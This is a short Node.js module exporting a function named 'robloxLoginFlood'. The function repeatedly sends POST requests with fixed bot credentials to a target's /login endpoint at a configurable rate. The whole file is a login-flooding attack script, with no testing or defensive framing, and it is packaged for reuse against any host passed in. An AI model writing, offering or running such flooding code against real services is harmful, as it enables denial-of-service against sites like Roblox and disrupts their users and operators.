const request = require('request');

function robloxLoginFlood(target, rateLimit) {
    setInterval(() => {
        const options = {
            url: `https://${target}/login`,
            method: 'POST',
            json: {
                username: 'bot',
                password: 'password'
            }
        };

        request(options, (error, response, body) => {
            if (error) {
                console.error('Error: ' + error.message);
            } else {
                console.log('Sent Roblox login request');
            }
        });
    }, 1000 / rateLimit);
}

module.exports = robloxLoginFlood;
